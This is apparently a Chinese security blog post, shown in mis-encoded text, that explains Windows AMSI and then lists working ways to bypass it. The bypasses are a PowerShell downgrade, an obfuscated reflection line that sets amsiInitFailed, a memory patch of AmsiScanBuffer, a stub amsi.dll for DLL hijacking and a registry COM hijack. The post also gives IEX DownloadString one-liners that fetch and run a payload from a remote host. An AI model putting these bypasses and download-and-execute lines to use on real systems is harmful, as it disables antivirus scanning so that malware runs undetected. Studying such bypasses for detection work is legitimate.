<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.UACï¼ˆEXEã€COMã€MSI æˆ– ActiveX å®‰è£…çš„æå‡ï¼‰       </span><br><span class="line">    %windir%\System32\consent.exe </span><br><span class="line"></span><br><span class="line">2.Powershellï¼ˆè„šæœ¬ã€äº¤äº’å¼ä½¿ç”¨å’ŒåŠ¨æ€ä»£ç è¯„ä¼°ï¼‰</span><br><span class="line">    System.Management.Automation.dll </span><br><span class="line"></span><br><span class="line">3.Windowsè„šæœ¬å®¿ä¸»</span><br><span class="line">    wscript.exe cscript.exe </span><br><span class="line"></span><br><span class="line">4.JavaScript VBScript</span><br><span class="line">    %windir%\System32\jscript.dll </span><br><span class="line">    %windir%\System32\vbscript.dll </span><br><span class="line"></span><br><span class="line">5.Office VBA macros</span><br><span class="line">	VBE7.dll</span><br><span class="line">6. .NET Assembly</span><br><span class="line">	clr.dll</span><br><span class="line">7. WMI</span><br><span class="line">	%windir%/System32/wbem/fastprox.dll</span><br></pre></td></tr></table></figure>

<h4 id="AMSI-Functions-Win32-API"><a href="#AMSI-Functions-Win32-API" class="headerlink" title="AMSI Functions(Win32 API)"></a>AMSI Functions(Win32 API)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AmsiCloseSession      // å…³é—­ç”± AmsiOpenSession æ‰“å¼€çš„ä¼šè¯</span><br><span class="line">AmsiInitialize        // åˆå§‹åŒ– AMSI API</span><br><span class="line">AmsiOpenSession       // æ‰“å¼€å¯åœ¨å…¶ä¸­å…³è”å¤šä¸ªæ‰«æè¯·æ±‚çš„ä¼šè¯</span><br><span class="line">AmsiResultsMalware    // ç¡®å®šæ‰«æç»“æœæ˜¯å¦æŒ‡ç¤ºåº”é˜»æ­¢å†…å®¹</span><br><span class="line">AmsiNotifyOperation   // å‘åæ¶æ„è½¯ä»¶æä¾›ç¨‹åºå‘é€ä»»æ„æ“ä½œçš„é€šçŸ¥ã€‚</span><br><span class="line">AmsiScanBuffer        // æ‰«æç¼“å†²åŒºä¸­çš„å†…å®¹ä¸­å¯»æ‰¾æ¶æ„è½¯ä»¶</span><br><span class="line">AmsiScanString        // æ‰«æå­—ç¬¦ä¸²ä¸­çš„æ¶æ„è½¯ä»¶</span><br><span class="line">AmsiUninitialize      // åˆ é™¤ AmsiInitializeæœ€åˆæ‰“å¼€çš„ AMSI API å®ä¾‹</span><br></pre></td></tr></table></figure>

<p>åé¢ä¸»è¦å…³æ³¨ <code>AmsiScanBuffer</code> å’Œ <code>AmsiScanString</code></p>
<br>

<h4 id="AMSIå·¥ä½œæµç¨‹"><a href="#AMSIå·¥ä½œæµç¨‹" class="headerlink" title="AMSIå·¥ä½œæµç¨‹"></a>AMSIå·¥ä½œæµç¨‹</h4><p>ä»¥ä¸‹æ˜¯å¾®è½¯å®˜ç½‘ç»™å‡ºçš„amsiçš„å·¥ä½œæµç¨‹å›¾ï¼š</p>
<p><img src="/posts/9af7df1e/0.jpg"></p>
<h4 id="ASMIå¯¹powershellçš„æ£€æµ‹æŸ¥æ€"><a href="#ASMIå¯¹powershellçš„æ£€æµ‹æŸ¥æ€" class="headerlink" title="ASMIå¯¹powershellçš„æ£€æµ‹æŸ¥æ€"></a>ASMIå¯¹powershellçš„æ£€æµ‹æŸ¥æ€</h4><p><img src="/posts/9af7df1e/1.png" alt="æˆªå›¾"></p>
<p>AMSIå¯ä»¥å½“æˆä¸€ä¸ªé€šé“ï¼Œç„¶åå°†æ¶æ„æ ·æœ¬äº¤ç»™æ€è½¯ï¼Œè®©æ€è½¯åšè¯†åˆ«</p>
<p>å¯åŠ¨ä¸€ä¸ªpowershellåï¼Œä¼šè‡ªåŠ¨åŠ è½½<code>amsi.dll</code></p>
<p><img src="/posts/9af7df1e/2.png" alt="æˆªå›¾"></p>
<p>è€ŒAMSIæ˜¯<strong>åŸºäºå­—ç¬¦ä¸²</strong>çš„æ£€æµ‹æœºåˆ¶ï¼Œåœ¨win10 è£…æœ‰WinDefçš„æœºå™¨ä¸‹è¿è¡Œä¸€äº›æ ‡è®°ä¸ºæ¶æ„å‘½ä»¤çš„ä»£ç æ—¶ï¼Œä¾¿ä¼šè¢«æ€è½¯æ‹¦æˆª(å›½å†…çš„æ€è½¯å¥½åƒéƒ½æ²¡è°ƒç”¨è¿™ä¸ªamsi)</p>
<p><img src="/posts/9af7df1e/3.png" alt="æˆªå›¾"></p>
<h4 id="AMSIå¯¹Office-VBAçš„æ£€æµ‹æŸ¥æ€"><a href="#AMSIå¯¹Office-VBAçš„æ£€æµ‹æŸ¥æ€" class="headerlink" title="AMSIå¯¹Office VBAçš„æ£€æµ‹æŸ¥æ€"></a>AMSIå¯¹Office VBAçš„æ£€æµ‹æŸ¥æ€</h4><p><a href="https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/">https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/</a></p>
<p>é€šè¿‡AMSIå¯¹å®è¿è¡Œæ—¶çš„æ‰«æè¿‡ç¨‹ï¼š</p>
<p><img src="/posts/9af7df1e/4.png" alt="æˆªå›¾"></p>
<p>è¿‡ç¨‹ä¸»è¦å¦‚ä¸‹:</p>
<ol>
<li><p>å½“è¿è¡Œé’“é±¼wordåï¼Œä¼šåŠ è½½å®æ–‡ä»¶ ã€‚VBAå®è¿è¡Œæ—¶ ä¼šæœ‰ä¸€ä¸ªç¼“å†²åŒºè®°å½•å®è¡Œä¸º</p>
</li>
<li><p>å½“è°ƒç”¨åˆ°é«˜é£é™©å‡½æ•°æˆ–æ–¹æ³•æ—¶ï¼Œä¼šåœæ­¢å®çš„è¿è¡Œï¼Œç„¶åé€šè¿‡AMSIå°†å†…å®¹ä¼ ä¼ é€’ç»™æ€è½¯</p>
</li>
<li><p>æ€è½¯æ‹¿åˆ°æ•°æ®ååˆ¤è¯»æ˜¯å¦ä¸ºæ¶æ„å®ï¼Œå¦‚æœè¡Œä¸ºæ— æ¶æ„ä¾¿å¯æ‰§è¡Œã€‚å¦åˆ™å…³é—­å®ä¼šè¯å¹¶å‘å‡ºå“åº”è­¦æŠ¥å’Œå¤„ç†æ¶æ„æ–‡ä»¶</p>
</li>
</ol>
<br>

<h3 id="Bypass-AMSI"><a href="#Bypass-AMSI" class="headerlink" title="Bypass AMSI"></a>Bypass AMSI</h3><h4 id="Powershell-é™çº§"><a href="#Powershell-é™çº§" class="headerlink" title="Powershell é™çº§"></a>Powershell é™çº§</h4><p>å°½ç®¡powershell 2.0å·²ç»è¢«å¾®è½¯ç»™å¼ƒç”¨äº†ï¼Œä½†å¹¶æœªåœ¨æ“ä½œç³»ç»Ÿä¸­åˆ é™¤ã€‚æ—§ç‰ˆæœ¬çš„powershellä¸­ä¸å­˜åœ¨AMSIæœºåˆ¶ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨è¿™ç§æ–¹å¼å»å°è¯•ç»•è¿‡AMSI</p>
<p>æŸ¥çœ‹powershellç‰ˆæœ¬</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$PSVersionTable</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨powershell2.0ç‰ˆæœ¬è¿è¡Œ</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="literal">-version</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>ç°åœ¨å¸¸è§çš„win10ã€Windows 2016ã€2019å¾ˆå°‘é¢„è£…æœ‰powershell2.0</p>
<p><img src="/posts/9af7df1e/9.png" alt="æˆªå›¾"></p>
<h4 id="å­—ç¬¦ä¸²ç»•è¿‡"><a href="#å­—ç¬¦ä¸²ç»•è¿‡" class="headerlink" title="å­—ç¬¦ä¸²ç»•è¿‡"></a>å­—ç¬¦ä¸²ç»•è¿‡</h4><blockquote>
<p>AMSIä½¿ç”¨â€œåŸºäºå­—ç¬¦ä¸²â€çš„æ£€æµ‹æªæ–½æ¥ç¡®å®šPowerShellä»£ç æ˜¯å¦ä¸ºæ¶æ„ä»£ç ã€‚</p>
</blockquote>
<h5 id="å­—ç¬¦ä¸²åˆ†å‰²"><a href="#å­—ç¬¦ä¸²åˆ†å‰²" class="headerlink" title="å­—ç¬¦ä¸²åˆ†å‰²"></a>å­—ç¬¦ä¸²åˆ†å‰²</h5><p><img src="/posts/9af7df1e/5.png" alt="æˆªå›¾"></p>
<h5 id="replaceæ›¿æ¢"><a href="#replaceæ›¿æ¢" class="headerlink" title="replaceæ›¿æ¢"></a>replaceæ›¿æ¢</h5><p><img src="/posts/9af7df1e/6.png" alt="æˆªå›¾"></p>
<br>

<h4 id="è„šæœ¬æ··æ·†å…³é—­AMSI"><a href="#è„šæœ¬æ··æ·†å…³é—­AMSI" class="headerlink" title="è„šæœ¬æ··æ·†å…³é—­AMSI"></a>è„šæœ¬æ··æ·†å…³é—­AMSI</h4><p>çœŸæ­£å»æ£€æµ‹æ ·æœ¬çš„æ˜¯æ€æ¯’è½¯ä»¶ï¼Œè€ŒAMSIå¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ªé€šé“ã€‚é‚£ä¹ˆå¦‚æœæŠŠAMSIå…³é—­æ‰ï¼Œæ¶æ„æ ·æœ¬å°±ä¸ä¼šå†é€šè¿‡AMSIä¼ ç»™æ€è½¯ã€‚</p>
<p><code>[Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;).GetField(&#39;amsiI nitFailed&#39;,&#39;NonPublic,Static&#39;).SetValue($null,$true)</code></p>
<p><img src="/posts/9af7df1e/7.png" alt="æˆªå›¾"></p>
<br>

<p>ç„¶åè¿›è¡Œæ··æ·†ä¸€ä¸‹</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&quot;amsiInitFaile&quot;</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$a</span>+[<span class="built_in">string</span>]([<span class="built_in">char</span>]<span class="number">100</span>)</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;System.Management.Automation.AmsiUtil&quot;</span></span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$b</span>+[<span class="built_in">string</span>]([<span class="built_in">char</span>]<span class="number">115</span>)</span><br><span class="line">[<span class="type">Ref</span>].Assembly.GetType(<span class="variable">$b</span>).GetField(<span class="variable">$a</span>,<span class="string">&#x27;NonPublic,Static&#x27;</span>).SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/posts/9af7df1e/8.png" alt="æˆªå›¾"></p>
<h4 id="å†…å­˜è¡¥ä¸"><a href="#å†…å­˜è¡¥ä¸" class="headerlink" title="å†…å­˜è¡¥ä¸"></a>å†…å­˜è¡¥ä¸</h4><p>ä¿®æ”¹AmsiScanBufferå‡½æ•°çš„å‚æ•°å€¼æ¥ç»•è¿‡AmsiScanBuffer()</p>
<p>ä¸€èˆ¬æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€æ˜¯ä¿®æ”¹æ‰«æé•¿åº¦ï¼Œè¿˜æœ‰å°±æ˜¯ä¿®æ”¹è¿”å›å€¼</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">HRESULT <span class="title">AmsiScanBuffer</span><span class="params">( </span></span></span><br><span class="line"><span class="params"><span class="function">    HAMSICONTEXT amsiContext,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG length,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCWSTR contentName,</span></span></span><br><span class="line"><span class="params"><span class="function">    HAMSISESSION amsiSession,</span></span></span><br><span class="line"><span class="params"><span class="function">    AMSI_RESULT *result </span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>è¯¦ç»†å¯ä»¥çœ‹<code>https://txluck.github.io/2022/03/26/bypass-AMSI/</code> è¿™ä¸ªå¸ˆå‚…çš„æ–‡ç« </p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$Win32</span> = <span class="string">@&quot;</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">public class Win32 &#123;</span></span><br><span class="line"><span class="string">    [DllImport(&quot;kernel32&quot;)]</span></span><br><span class="line"><span class="string">    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span></span><br><span class="line"><span class="string">    [DllImport(&quot;kernel32&quot;)]</span></span><br><span class="line"><span class="string">    public static extern IntPtr LoadLibrary(string name);</span></span><br><span class="line"><span class="string">    [DllImport(&quot;kernel32&quot;)]</span></span><br><span class="line"><span class="string">    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line"><span class="built_in">Add-Type</span> <span class="variable">$Win32</span></span><br><span class="line"><span class="variable">$LoadLibrary</span> = [<span class="type">Win32</span>]::LoadLibrary(<span class="string">&quot;am&quot;</span> + <span class="string">&quot;si.dll&quot;</span>)</span><br><span class="line"><span class="variable">$Address</span> = [<span class="type">Win32</span>]::GetProcAddress(<span class="variable">$LoadLibrary</span>, <span class="string">&quot;Amsi&quot;</span> + <span class="string">&quot;Scan&quot;</span> + <span class="string">&quot;Buffer&quot;</span>)</span><br><span class="line"><span class="variable">$p</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯ä»¥æ·»åŠ ä¸€äº›æ··æ·†é¢„é˜²è¢«äº‘é˜²æŠ¤æ ‡è®°</span></span><br><span class="line">[<span class="type">Win32</span>]::VirtualProtect(<span class="variable">$Address</span>, [<span class="type">uint32</span>]<span class="number">5</span>, <span class="number">0</span>x40, [<span class="type">ref</span>]<span class="variable">$p</span>)</span><br><span class="line"><span class="variable">$Patch</span> = [<span class="built_in">Byte</span>[]] (<span class="number">0</span>xB8, <span class="number">0</span>x57, <span class="number">0</span>x00, <span class="number">0</span>x07, <span class="number">0</span>x80, <span class="number">0</span>xC3)    <span class="comment">#This will cause the return code of AmsiScanBuffer to be E_INVALIDARG, but the actual scan result to be 0 â€“ often interpreted as AMSI_RESULT_CLEAN.</span></span><br><span class="line">[<span class="type">System.Runtime.InteropServices.Marshal</span>]::<span class="built_in">Copy</span>(<span class="variable">$Patch</span>, <span class="number">0</span>, <span class="variable">$Address</span>, <span class="number">6</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨GetProcAddress()è·å–AmsiScanBuffer()å¥æŸ„ï¼Œç„¶åæ‰¾åˆ°AmsiScanBuffer()è¦ä¿®è¡¥çš„åœ°å€ è¿™é‡Œåœ°å€ä¸º0x80070057h ï¼ˆ64ä½ä¸‹ï¼‰.ç„¶åä½¿ç”¨VirtualProtectä¿®æ”¹AmsiScanBuffer()å‡½æ•°çš„å‚æ•°å€¼</p>
<h4 id="è¿œç¨‹åŠ è½½"><a href="#è¿œç¨‹åŠ è½½" class="headerlink" title="è¿œç¨‹åŠ è½½"></a>è¿œç¨‹åŠ è½½</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨.netä¸­çš„WebRequestå»è¿œç¨‹è¯·æ±‚æ¶æ„æ ·æœ¬å†…å®¹å¹¶è¿›è¡Œè¯»å–æ‰§è¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$webreq</span> = [<span class="type">System.Net.WebRequest</span>]::Create(<span class="string">&#x27;http://10.10.10.114:8000/payload.txt&#x27;</span>)</span><br><span class="line"><span class="variable">$resp</span>=<span class="variable">$webreq</span>.GetResponse()</span><br><span class="line"><span class="variable">$respstream</span>=<span class="variable">$resp</span>.GetResponseStream()</span><br><span class="line"><span class="variable">$reader</span>=[<span class="type">System.IO.StreamReader</span>]::new(<span class="variable">$respstream</span>)</span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$reader</span>.ReadToEnd()</span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$reader</span>.ReadToEnd()</span><br><span class="line"><span class="built_in">IEX</span>(<span class="variable">$content</span>)</span><br></pre></td></tr></table></figure>



<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">IEX</span>([<span class="type">Net.Webclient</span>]::new().DownloadString(<span class="string">&quot;http://10.10.10.114:8000/payload.txt&quot;</span>)</span><br><span class="line"><span class="built_in">IEX</span> ((<span class="built_in">new-object</span> net.webclient).downloadstring(<span class="string">&quot;http://10.10.10.114:8000/payload.txt&quot;</span>)</span><br><span class="line"><span class="comment">#å¯ä»¥ä½¿ç”¨ .replace()å»ç®€å•å¤„ç†</span></span><br></pre></td></tr></table></figure>

<br>

<h4 id="åŠ«æŒamsi-dll"><a href="#åŠ«æŒamsi-dll" class="headerlink" title="åŠ«æŒamsi.dll"></a>åŠ«æŒamsi.dll</h4><p>åœ¨ä½¿ç”¨loadlibraryå‡½æ•°å¯¼å…¥amsi.dllæ—¶æ²¡ç”¨ä½¿ç”¨ç»å¯¹è·¯å¾„ æ ¹æ®ç¨‹åºå¯»æ‰¾dllçš„æ–¹å¼ï¼Œä¼šå…ˆåœ¨å½“å‰ç›®å½•ä¸‹å»å¯»æ‰¾ï¼Œæ‰€ä»¥å¯ä»¥åœ¨powershellå½“å‰ç›®å½•ä¸‹å»å†™ä¸€ä¸ªæ¶æ„dll è¿›è¡ŒåŠ«æŒï¼ˆä½†æ˜¯æ¶‰åŠåˆ°å…æ€é—®é¢˜ï¼Œç›®å‰è¿˜ä¸ä¼šåš X__Xï¼‰â€¦</p>
<p>ç”±äºæ˜¯ä¸€ä¸ªè½åœ°çš„amsi.dll æ‰€ä»¥æ¶‰åŠåˆ°å…æ€é—®é¢˜ï¼ˆç›®å‰è¿˜ä¸ä¼šåš X__Xï¼‰</p>
<p>è€Œä¸”è¦æ”¾åœ¨powershellå½“å‰ç›®å½•ä¸‹ ä¸€èˆ¬éœ€è¦é«˜æƒé™æ“ä½œï¼Œæ‰€ä»¥æœ‰äº›ä¸å¤ªç°å®.ä¸‹é¢è¿™ä¸ªæ˜¯ç½‘ä¸Šå¸ˆå‚…çš„ä»£ç (<code>(https://www.cnblogs.com/-zhong/p/15667734.html</code>)ï¼Œç”Ÿæˆamsi.dllå æ”¾åˆ°powershellçš„ç›®å½•ä¸‹å³å¯è¿›è¡ŒamsI.dllçš„åŠ«æŒ</p>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨<code>Aheadlib</code>ç”ŸæˆåŠ«æŒçš„dll</p>
<p>è¿™é‡Œæœ‰ä¸¤ä¸ªå¯ä»¥åŠ«æŒçš„åœ°æ–¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\WindowsPowerShell\v1.0</span><br><span class="line">C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management\v4.0_4.0.0.0__b03f5f7f11d50a3a</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line">LPCWSTR appName = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">HAMSICONTEXT</span> &#123;</span><br><span class="line">    DWORD       Signature;            <span class="comment">// &quot;AMSI&quot; or 0x49534D41</span></span><br><span class="line">    PWCHAR      AppName;           <span class="comment">// set by AmsiInitialize</span></span><br><span class="line">    DWORD       Antimalware;       <span class="comment">// set by AmsiInitialize</span></span><br><span class="line">    DWORD       SessionCount;      <span class="comment">// increased by AmsiOpenSession</span></span><br><span class="line">&#125; HAMSICONTEXT;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">AMSI_RESULT</span> &#123;</span><br><span class="line">    AMSI_RESULT_CLEAN,</span><br><span class="line">    AMSI_RESULT_NOT_DETECTED,</span><br><span class="line">    AMSI_RESULT_BLOCKED_BY_ADMIN_START,</span><br><span class="line">    AMSI_RESULT_BLOCKED_BY_ADMIN_END,</span><br><span class="line">    AMSI_RESULT_DETECTED</span><br><span class="line">&#125; AMSI_RESULT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">HAMSISESSION</span> &#123;</span><br><span class="line">    DWORD test;</span><br><span class="line">&#125; HAMSISESSION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">r</span> &#123;</span><br><span class="line">    DWORD r;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AmsiInitialize</span><span class="params">(LPCWSTR appName, HAMSICONTEXT* amsiContext)</span> </span>&#123;&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AmsiOpenSession</span><span class="params">(HAMSICONTEXT amsiContext, HAMSISESSION* amsiSession)</span> </span>&#123;&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AmsiCloseSession</span><span class="params">(HAMSICONTEXT amsiContext, HAMSISESSION amsiSession)</span> </span>&#123;&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AmsiResultIsMalware</span><span class="params">(r)</span> </span>&#123;&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AmsiScanBuffer</span><span class="params">(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT* result)</span> </span>&#123;&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AmsiScanString</span><span class="params">(HAMSICONTEXT amsiContext, LPCWSTR string, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT* result)</span> </span>&#123;&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AmsiUninitialize</span><span class="params">(HAMSICONTEXT amsiContext)</span> </span>&#123;&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/9af7df1e/11.png"></p>
<br>

<h4 id="COM-ServeråŠ«æŒ"><a href="#COM-ServeråŠ«æŒ" class="headerlink" title="COM ServeråŠ«æŒ"></a>COM ServeråŠ«æŒ</h4><p>åŸç†ï¼šamsi.dllåœ¨è€ç‰ˆæœ¬ä¸­ä½¿ç”¨ CoCreateInstance()å‡½æ•°è°ƒç”¨IIDå’ŒCLSIDæ¥å®ä¾‹åŒ–COMæ¥å£ã€‚è€Œè¿™ä¸ªå‡½æ•°ä¼šå…ˆ<br>ä»æ³¨å†Œè¡¨HKCUä¸­æ‰¾å¯¹åº”çš„dllå»è§£æï¼Œä¹Ÿå°±æ˜¯å½“å‰ç”¨æˆ·ï¼Œå› æ­¤æˆ‘ä»¬åˆ›å»ºç›¸åº”çš„æ³¨å†Œè¡¨ï¼Œè®©å®ƒè°ƒç”¨å¤±è´¥å°±è¡Œäº†ã€‚ç®€å•æ¥è¯´åˆ©ç”¨çš„æ˜¯æ³¨å†Œè¡¨ä¼˜å…ˆçº§æ¥ç»•è¿‡</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version <span class="number">5.00</span></span><br><span class="line">[<span class="type">HKEY_CURRENT_USER</span>/<span class="type">Software</span>/<span class="type">Classes</span>/<span class="type">CLSID</span>/&#123;<span class="type">fdb00e52</span>-<span class="type">a214</span>-<span class="number">4</span><span class="type">aa1</span>-<span class="number">8</span><span class="type">fba</span>-</span><br><span class="line"><span class="number">4357</span><span class="type">bb0072ec</span>&#125;]</span><br><span class="line"></span><br><span class="line">[<span class="type">HKEY_CURRENT_USER</span>/<span class="type">Software</span>/<span class="type">Classes</span>/<span class="type">CLSID</span>/&#123;<span class="type">fdb00e52</span>-<span class="type">a214</span>-<span class="number">4</span><span class="type">aa1</span>-<span class="number">8</span><span class="type">fba</span>-<span class="number">4357</span><span class="type">bb0072ec</span>&#125;/<span class="type">InProcServer32</span>]</span><br><span class="line"><span class="selector-tag">@</span>=<span class="string">&quot;C://goawayamsi.dll&quot;</span></span><br></pre></td></tr></table></figure>

<p>è€Œå¾®è½¯é€šè¿‡ç›´æ¥è°ƒç”¨amsi.dll çš„ <code>DllGetClassObject()</code> å‡½æ•°æ›¿æ¢ <code>CoCreateInstance()</code>ï¼Œé¿å…äº†æ³¨å†Œè¡¨è§£æ(ç°å·²å¤±æ•ˆï¼Œå­¦ä¹ ä¸‹æ€è·¯)</p>
<h4 id="AMSI-fail"><a href="#AMSI-fail" class="headerlink" title="AMSI.fail"></a><a href="https://amsi.fail/">AMSI.fail</a></h4><p><img src="/posts/9af7df1e/10.png"></p>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><blockquote>
<p><a href="https://github.com/INotGreen/Bypass-AMSI">https://github.com/INotGreen/Bypass-AMSI</a></p>
<p><a href="https://www.freebuf.com/articles/system/263966.html">https://www.freebuf.com/articles/system/263966.html</a></p>
<p><a href="https://www.contextis.com/us/blog/amsi-bypass">https://www.contextis.com/us/blog/amsi-bypass</a></p>
<p><a href="https://forum.butian.net/share/777">https://forum.butian.net/share/777</a></p>
<p><a href="https://xz.aliyun.com/t/3095">https://xz.aliyun.com/t/3095</a></p>
<p><a href="https://www.cnblogs.com/-zhong/p/15667734.html">https://www.cnblogs.com/-zhong/p/15667734.html</a></p>
<p><a href="https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/">https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/</a></p>
<p><a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell</a></p>
<p><a href="https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/">https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/</a></p>
<p><a href="https://txluck.github.io/2022/03/26/bypass-AMSI/">https://txluck.github.io/2022/03/26/bypass-AMSI/</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>powershellå…æ€</title>
    <url>/posts/adb63639/</url>
    <content><![CDATA[<br>

<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><blockquote>
<p>Windows PowerShell æ˜¯ä¸€ç§å‘½ä»¤è¡Œå¤–å£³ç¨‹åºå’Œè„šæœ¬ç¯å¢ƒï¼Œä½¿å‘½ä»¤è¡Œç”¨æˆ·å’Œè„šæœ¬ç¼–å†™è€…å¯ä»¥åˆ©ç”¨ .NET Frameworkçš„å¼ºå¤§åŠŸèƒ½ã€‚powershellä¸€ç›´éƒ½æ˜¯å†…ç½‘æ¸—é€çš„å¤§çƒ­é—¨ï¼Œå¾®è½¯æ˜¯çœŸæ­£çš„åœ¨æ¨è¡ŒPowerShellï¼ŒåŒ…æ‹¬Officeç­‰æ›´å¤šè‡ªå®¶è½¯ä»¶ï¼Œåº•å±‚éƒ½æ˜¯è°ƒç”¨PowerShellæ¥å®ç°ï¼Œè¿‘å¹´æ¥åˆ©ç”¨powershellæ¥æå†…ç½‘æ¸—é€è¿›è¡Œæ¨ªå‘æˆ–å…æ€çš„çƒ­åº¦ä¸€ç›´å±…é«˜ä¸ä¸‹.</p>
</blockquote>
<p>powershellæ˜¯ä¸€ç§å‘½ä»¤è¡Œå¤–å£³ç¨‹åºå’Œè„šæœ¬ç¯å¢ƒï¼Œä½¿å‘½ä»¤è¡Œç”¨æˆ·å’Œè„šæœ¬ç¼–å†™è€…å¯ä»¥åˆ©ç”¨ .NET Framework<br>çš„å¼ºå¤§åŠŸèƒ½ï¼ŒPowerShellè„šæœ¬çš„æ–‡æœ¬æ–‡ä»¶ï¼Œå…¶æ–‡ä»¶åéœ€è¦åŠ ä¸Šæ‰©å±•åâ€œ.PS1â€ã€‚PowerShelléœ€è¦.NETç¯å¢ƒ<br>çš„æ”¯æŒï¼ŒåŒæ—¶æ”¯æŒ.NETå¯¹è±¡ï¼Œå…¶å¯è¯»æ€§ã€æ˜“ç”¨æ€§å±…æ‰€æœ‰Shellä¹‹é¦–ã€‚<br>PowerShellå…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p>
<ul>
